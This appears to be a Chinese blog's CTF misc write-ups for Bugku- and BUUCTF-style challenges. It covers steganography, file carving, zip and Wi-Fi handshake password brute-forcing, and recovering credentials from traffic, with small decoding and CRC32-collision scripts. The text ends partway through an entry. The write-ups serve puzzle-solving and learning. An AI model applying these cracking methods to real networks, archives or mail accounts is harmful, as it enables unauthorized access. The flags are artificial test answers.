<p>拖进notepad里发现有隐藏文件，还有一串数字，hex转ascil后得到明文<br><figure class="image-box">
                <img src="./55.png" alt="图片](./9.png)![图片" title class>
                <p>图片](./9.png)![图片</p>
            </figure><br><figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>改后缀得到加密压缩包，输入明文，得到flag.txt<br>flag{3XiF_iNf0rM@ti0n}</p>
<h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>拖进notepad，发现有别的图片，用foremost（windows）进行分离，得到flag图片<br><figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>falg{NSCTF_e6532a34928a3d1dadd0b049d5a3cc57}</p>
<h2 id="猜"><a href="#猜" class="headerlink" title="猜"></a>猜</h2><figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>拖进notepad，发现是iCCPICC Profile，是取证类题目<br>根据flag格式提示，用百度以图搜图，是刘亦菲<br><figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>key{liuyifei}</p>
<h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>是一个bin文件，根据提示宽带信息，用routerpassview打开<br><figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{053700357621}</p>
<h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>拖进notepad<br><figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>改后缀rar解压得到文件<br><figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>三个人物对应扑克牌中的KQJ，试了一些组合都没用，直接爆破<br><figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>得到一张图片<br><figure class="image-box">
                <img src="./20.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>拖进notepad结尾有flag<br><figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>解base64<br><figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>f1@g{y0u Are a h@cker!}</p>
<h2 id="多种方法解决"><a href="#多种方法解决" class="headerlink" title="多种方法解决"></a>多种方法解决</h2><p>解压得到KEY.exe，拖进notepad得到图片base64码，解码得到二维码<br><figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>扫描得到  KEY{dca57f966e4e4e31fd5b15417da63269}</p>
<h2 id="闪的好快"><a href="#闪的好快" class="headerlink" title="闪的好快"></a>闪的好快</h2><p>是个gif，stegsolve提取帧，有18张图片，每张都扫一下，把字符串起来<br>SYC{F1aSh_so_f4sT}</p>
<h2 id="come-game"><a href="#come-game" class="headerlink" title="come_game"></a>come_game</h2><p>居然是我最喜欢的iwanna游戏！！（没忍住玩了一会）<br><figure class="image-box">
                <img src="./24.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>拿到存档文件后,拖进notepad,修改关卡参数<br><figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>及时截图<br><figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>FLAG{6E23F259D98DF153}<br>提交出错,猜想和上一道题是同一个比赛的题,提交格式应该一样<br>SYC{6E23F259D98DF153}</p>
<h2 id="白哥的鸽子"><a href="#白哥的鸽子" class="headerlink" title="白哥的鸽子"></a>白哥的鸽子</h2><p>改后缀为jpg，打开是张鸽子<br><figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>拖进notepad发现结尾有字符串<br><figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>看格式和栅栏密码有关，解密得到<br><figure class="image-box">
                <img src="./29.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{w22_is_v3ry_cool}</p>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>在winhex里搜key关键字就能找到<br><figure class="image-box">
                <img src="./30.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>key{feb81d3834e2423c9903f4755464060b}</p>
<h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>解压是张(●—●)大白~<br>拖进winhex改高度，得到flag<br><figure class="image-box">
                <img src="./31.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{He1l0_d4_ba1}</p>
<h2 id="做个游戏-08067CTF"><a href="#做个游戏-08067CTF" class="headerlink" title="做个游戏(08067CTF)"></a>做个游戏(08067CTF)</h2><p>是个jar文件，右键用java打开，根据提示要坚持60s（不可能）<br>解压得到一些class文件，即编译过的java文件，用jd-gui打开<br><figure class="image-box">
                <img src="./32.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{RGFqaURhbGlfSmlud2FuQ2hpamk=}<br>base64解密得  flag{DajiDali_JinwanChiji}</p>
<h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>文件是个wireshark的数据包，拖进软件里查看<br>因为wifi连接的四次握手包是eapol协议，过滤<br><figure class="image-box">
                <img src="./33.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>手机号是11位，已经提示了七位1391040，写个字典爆破后四位<br>用ewsa WiFi密码破解器<br><figure class="image-box">
                <img src="./34.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>。。v7版本下的太新了，换了个v6版本的试试<br><figure class="image-box">
                <img src="./35.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>得到flag{13910407686}</p>
<h2 id="linux2"><a href="#linux2" class="headerlink" title="linux2"></a>linux2</h2><p>按照上一题的套路，直接搜索key，没找到，搜{找到了（居然是大写）<br><figure class="image-box">
                <img src="./36.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>KEY{24f3627a86fc740a7f36ee2c7a1c124a}</p>
<h2 id="账号被盗了"><a href="#账号被盗了" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><p>看源码，是个post传参<br><figure class="image-box">
                <img src="./37.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>burpsuite抓包分析下<br><figure class="image-box">
                <img src="./38.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>下文件分析<br><figure class="image-box">
                <img src="./39.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>用wireshark抓包，得到一串base64，解码得到<br><a href="mailto:bkctftest@163.com" target="_blank" rel="noopener">bkctftest@163.com</a><br>a123456<br>登陆163邮箱<br><figure class="image-box">
                <img src="./40.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./41.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>唉我去，邮箱里真乱，还好好心人是在的<br>flag{182100518+725593795416}</p>
<h2 id="细心的大象"><a href="#细心的大象" class="headerlink" title="细心的大象"></a>细心的大象</h2><p>解压得到一张图片<br><figure class="image-box">
                <img src="./42.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>看一下属性<br><figure class="image-box">
                <img src="./43.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>base64解密文   TVNEUzQ1NkFTRDEyM3p6     MSDS456ASD123zz<br>foremost分离一下，得到rar<br>用密码解压，得到一张图片，熟悉的改高度，得到flag<br><figure class="image-box">
                <img src="./44.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>BUGKU{a1e5aSA}</p>
<h2 id="爆照-08067CTF"><a href="#爆照-08067CTF" class="headerlink" title="爆照(08067CTF)"></a>爆照(08067CTF)</h2><p>格式  flag{xxx_xxx_xxx}<br><figure class="image-box">
                <img src="./45.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>foremost分离下<br><figure class="image-box">
                <img src="./46.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>得到<br><figure class="image-box">
                <img src="./47.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>给它们改后缀名成图片，在88.jpg里发现二维码，扫描得到  bilibili<br>接着发现888.jpg里也有点东西<br><figure class="image-box">
                <img src="./48.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>c2lsaXNpbGk=       解base64得       silisili<br>8888.jpg里也有东西，是一张二维码<br><figure class="image-box">
                <img src="./49.png" alt="图片" title class>
                <p>图片</p>
            </figure><br><figure class="image-box">
                <img src="./50.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>扫描得到  panama<br>按顺序来排  flag{bilibili_silisili_panama}</p>
<h2 id="猫片-安恒"><a href="#猫片-安恒" class="headerlink" title="猫片(安恒)"></a>猫片(安恒)</h2><p>hint:LSB BGR NTFS<br>拖进winhex里发现png文件头，改后缀名得到一只喵喵（好可爱）<br><figure class="image-box">
                <img src="./51.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>根据提示去stegsolve里提取一下色素<br><figure class="image-box">
                <img src="./52.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>提取后改文件头得到新图片,半张二维码<br>继续改高度,反相后扫描,得到一个网址<br><a href="https://pan.baidu.com/s/1pLT2J4f" target="_blank" rel="noopener">https://pan.baidu.com/s/1pLT2J4f</a><br>下载得到flag.rar,解压后(呵)<br><figure class="image-box">
                <img src="./53.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>根据最后一个hint提示,用到NtFsStreamsEditor工具捕捉数据流<br><figure class="image-box">
                <img src="./54.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>导出flag.pyc文件,在线反编译<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span><span class="params">()</span>:</span></span><br><span class="line">    flag = <span class="string">'*************'</span></span><br><span class="line">    ciphertext = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(flag)):</span><br><span class="line">        s = chr(i ^ ord(flag[i]))</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = ord(s) + <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = ord(s) - <span class="number">10</span></span><br><span class="line">        ciphertext.append(str(s))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ciphertext[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">ciphertext = [</span><br><span class="line">    <span class="string">'96'</span>,</span><br><span class="line">    <span class="string">'65'</span>,</span><br><span class="line">    <span class="string">'93'</span>,</span><br><span class="line">    <span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'91'</span>,</span><br><span class="line">    <span class="string">'97'</span>,</span><br><span class="line">    <span class="string">'22'</span>,</span><br><span class="line">    <span class="string">'93'</span>,</span><br><span class="line">    <span class="string">'70'</span>,</span><br><span class="line">    <span class="string">'102'</span>,</span><br><span class="line">    <span class="string">'94'</span>,</span><br><span class="line">    <span class="string">'132'</span>,</span><br><span class="line">    <span class="string">'46'</span>,</span><br><span class="line">    <span class="string">'112'</span>,</span><br><span class="line">    <span class="string">'64'</span>,</span><br><span class="line">    <span class="string">'97'</span>,</span><br><span class="line">    <span class="string">'88'</span>,</span><br><span class="line">    <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'82'</span>,</span><br><span class="line">    <span class="string">'137'</span>,</span><br><span class="line">    <span class="string">'90'</span>,</span><br><span class="line">    <span class="string">'109'</span>,</span><br><span class="line">    <span class="string">'99'</span>,</span><br><span class="line">    <span class="string">'112'</span>]</span><br></pre></td></tr></table></figure></p>
<p>根据这个写一个解密脚本(参考了一下师傅的)<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">()</span>:</span></span><br><span class="line">    ciphertext = [</span><br><span class="line">    <span class="string">'96'</span>,</span><br><span class="line">    <span class="string">'65'</span>,</span><br><span class="line">    <span class="string">'93'</span>,</span><br><span class="line">    <span class="string">'123'</span>,</span><br><span class="line">    <span class="string">'91'</span>,</span><br><span class="line">    <span class="string">'97'</span>,</span><br><span class="line">    <span class="string">'22'</span>,</span><br><span class="line">    <span class="string">'93'</span>,</span><br><span class="line">    <span class="string">'70'</span>,</span><br><span class="line">    <span class="string">'102'</span>,</span><br><span class="line">    <span class="string">'94'</span>,</span><br><span class="line">    <span class="string">'132'</span>,</span><br><span class="line">    <span class="string">'46'</span>,</span><br><span class="line">    <span class="string">'112'</span>,</span><br><span class="line">    <span class="string">'64'</span>,</span><br><span class="line">    <span class="string">'97'</span>,</span><br><span class="line">    <span class="string">'88'</span>,</span><br><span class="line">    <span class="string">'80'</span>,</span><br><span class="line">    <span class="string">'82'</span>,</span><br><span class="line">    <span class="string">'137'</span>,</span><br><span class="line">    <span class="string">'90'</span>,</span><br><span class="line">    <span class="string">'109'</span>,</span><br><span class="line">    <span class="string">'99'</span>,</span><br><span class="line">    <span class="string">'112'</span>]</span><br><span class="line">    ciphertext.reverse()</span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">            s = int(ciphertext[i]) - <span class="number">10</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s = int(ciphertext[i]) + <span class="number">10</span></span><br><span class="line">        s=chr(i^s)</span><br><span class="line">        flag += s</span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    flag = decode()</span><br><span class="line">    print(flag)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
<p>跑一下得到flag<br>flag{Y@e_Cl3veR_C1Ever!}</p>
]]></content>
      
        <categories>
            
            <category> ctf writeup misc </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 个人ctf竞赛 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[BUUCTF misc wp(部分)]]></title>
      <url>/ctf-writeup-misc/ckwd5ws74001dd0uc2o12ocw4/</url>
      <content type="html"><![CDATA[<p>网站地址: <a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">buuctf</a></p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><figure class="image-box">
                <img src="./1.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p> flag{buu_ctf}</p>
<h2 id="梅花香之苦寒来"><a href="#梅花香之苦寒来" class="headerlink" title="梅花香之苦寒来"></a>梅花香之苦寒来</h2><p>解压得到一张图片<br><figure class="image-box">
                <img src="./2.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>拖入notepad,在文件尾发现一大串字符,提取出来hex-&gt;ascil,得到坐标<br><figure class="image-box">
                <img src="./3.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>写脚本转化成二维码，扫描得到flag<br>flag{40fc0a979f759c8892f4dc045e28b820}</p>
<h2 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h2><p>解压是条蛇(有点可爱)<br><figure class="image-box">
                <img src="./4.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>拖进notepad在文档尾有一串base64,解密得,还有一个zip头<br><figure class="image-box">
                <img src="./5.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>foremost分离得到两个文件<br><figure class="image-box">
                <img src="./6.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>百度搜了下key,得到 anaconda<br>另一个key在cipher里,是一串乱码,百度了下关于蛇的解密算法,是serpent加密<br><figure class="image-box">
                <img src="./7.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{who_knew_serpent_cipher_existed}</p>
<h2 id="荷兰宽带数据泄露"><a href="#荷兰宽带数据泄露" class="headerlink" title="荷兰宽带数据泄露"></a>荷兰宽带数据泄露</h2><p>拖进routerpassview,发现用户信息<br><figure class="image-box">
                <img src="./8.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{053700357621}</p>
<h2 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h2><p>扫描得到信息  secret is here<br>拖进notepad里发现有隐藏文件<br>foremost分离,得到一个有密码的zip<br><figure class="image-box">
                <img src="./9.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>只有4个数字,生成一个字典,直接爆破<br><figure class="image-box">
                <img src="./10.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>解压,得到 flag{vjpw_wnoei}</p>
<h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><figure class="image-box">
                <img src="./11.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>拖进stegsolve里,提取像素<br><figure class="image-box">
                <img src="./12.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{st3g0_saurus_wr3cks}</p>
<h2 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h2><p>拖进notepad得到图片base64码，解码得到二维码<br><figure class="image-box">
                <img src="./13.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>扫描得到  flag{dca57f966e4e4e31fd5b15417da63269}</p>
<h2 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h2><p>拖进au,看频谱<br><figure class="image-box">
                <img src="./14.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>提取摩斯密码,解密<br><figure class="image-box">
                <img src="./15.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{5BC925649CB0188F52E617D70929191C}</p>
<h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><figure class="image-box">
                <img src="./16.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>肉眼可见的左上角高斯模糊,拖进notepad,尾部发现一串01<br><figure class="image-box">
                <img src="./55.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>转字符串  koekj3s<br>flag{koekj3s}</p>
<h2 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h2><figure class="image-box">
                <img src="./17.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>神奇的题目,拖进notepad,结尾就是flag<br><figure class="image-box">
                <img src="./18.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{stego_is_s0_bor1ing}</p>
<h2 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h2><figure class="image-box">
                <img src="./19.png" alt="图片" title class>
                <p>图片</p>
            </figure>盲文密码,解密得到  kmdonowg<br>解压得到摩斯电码,提取解密得flag<br>flag{wpei08732?23dz}<br><br>## LSB<br><br><img src="./20.png" alt="图片"><br>stegsolve提取像素,改后缀为png<br><figure class="image-box">
                <img src="./21.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>得到flag<br>flag{1sb_i4_s0_Ea4y}</p>
<h2 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h2><figure class="image-box">
                <img src="./22.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>查看属性,得到信息  this_is_not_password<br>拖进notepad,在结尾发现flag.txt<br><figure class="image-box">
                <img src="./23.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>得到一个加密压缩包,用上面信息解密,得到flag<br>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p>
<h2 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h2><figure class="image-box">
                <img src="./24.gif" alt="图片" title class>
                <p>图片</p>
            </figure>肉眼可见的flag,拖进stegsolve分离帧,再拼起来,分别在21,51,79<br>flag{he11ohongke}<br><br>## 九连环<br><br><figure class="image-box">
                <img src="./25.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>拖进notepad里发现有隐藏文件,foremost分离得到一张图片和压缩包<br>图片可以steghide解密<br><figure class="image-box">
                <img src="./26.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>压缩包是个伪加密,修改后解压得到flag<br>flag{1RTo8w@&amp;4nK@z*XL}</p>
<h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><figure class="image-box">
                <img src="./27.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>拖进notepad,结尾发现flag.vmdk<br><figure class="image-box">
                <img src="./28.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>是个伪加密,修改解压得到文件,拖进winhex看到一个ook密码文件和一个brainfuck密码文件<br><figure class="image-box">
                <img src="./29.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>分别解密,拼接<br><figure class="image-box">
                <img src="./31.png" alt="图片](./30.png)![图片" title class>
                <p>图片](./30.png)![图片</p>
            </figure><br>flag{N7F5_AD5_i5_funny!}</p>
<h2 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h2><p>解压是张大白,目测下方被截掉,拖进winhex改高度<br><figure class="image-box">
                <img src="./32.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{He1l0_d4_ba1}</p>
<h2 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h2><p>(我一个做misc的要哭了,现学ida)<br>打开是个exe,拖进ida里,在strings window找到”well done”的地方对应的函数,查看伪代码<br><figure class="image-box">
                <img src="./33.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>差不多意思是我们输入的字符串长度要小于等于6,在转换为整型时数值+1,再用itoa()将整型转字符串,从这里可以判断出v10的值应该是122,并且要连接两段字符串,把if里的数值转整型后<br><figure class="image-box">
                <img src="./34.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>根据顺序判断密码是122xyz<br><figure class="image-box">
                <img src="./35.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>flag{123_Buff3r_0v3rf|0w}</p>
<h2 id="sqltest"><a href="#sqltest" class="headerlink" title="sqltest"></a>sqltest</h2><p>是个流量包,拖进wireshark里,发现有很多盲注痕迹<br>常规操作,导出HTTP进行分析,save all后在文件夹里进行排序<br><figure class="image-box">
                <img src="./36.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>当盲注结果为true时文件大小都是780b,经过文件内容的对比,发现都有Version被注出,根据条件找到有flag信息的盲注点,按名称和文件大小的排序提取ascil值<br><figure class="image-box">
                <img src="./37.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>贴脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'102 108 97 103 123 52 55 101 100 98 56 51 48 48 101 100 53 102 57 98 50 56 102 99 53 52 98 48 100 48 57 101 99 100 101 102 55 125'</span></span><br><span class="line">a=a.split(<span class="string">' '</span>)</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    flag=flag+chr(int(i))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>转换后:flag{47edb8300ed5f9b28fc54b0d09ecdef7}</p>
<h2 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h2><figure class="image-box">
                <img src="./38.png" alt="图片" title class>
                <p>图片</p>
            </figure>
<p>hint里提到了社工和四位数密码,生成字典丢尽ziperello里一跑<br><figure class="image-box">
                <img src="./39.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>解压得到flag<br>flag{b025fc9ca797a67d2103bfbc407a6d5f}</p>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><p>解压后是68个压缩包,拖进winhex分析,不是伪加密,hint提示是base64,每个文件是4b,所以每个bata.txt应该是4个字符,写脚本进行批量crc32碰撞</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackCrc</span><span class="params">(crc)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> dic:</span><br><span class="line">                    s = a + b + c + d</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'out'</span> + str(i) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file,<span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line"><span class="comment">#dic = string.printable</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>跑完大概十分钟?没太注意<br><figure class="image-box">
                <img src="./40.png" alt="图片" title class>
                <p>图片</p>
            </figure><br>尝试过网站在线转,会多出很多00,只好自己写脚本转</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'out.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">f1 = open(<span class="string">'out1.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">f1.write(str(base64.b64decode(f.read())))</span><br><span class="line">f.close()</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure>
<p>base64解密后粘贴到winhex,提示要修复压缩包,看到CF 90 73,修补rar文件头<br><figure class="image-box">
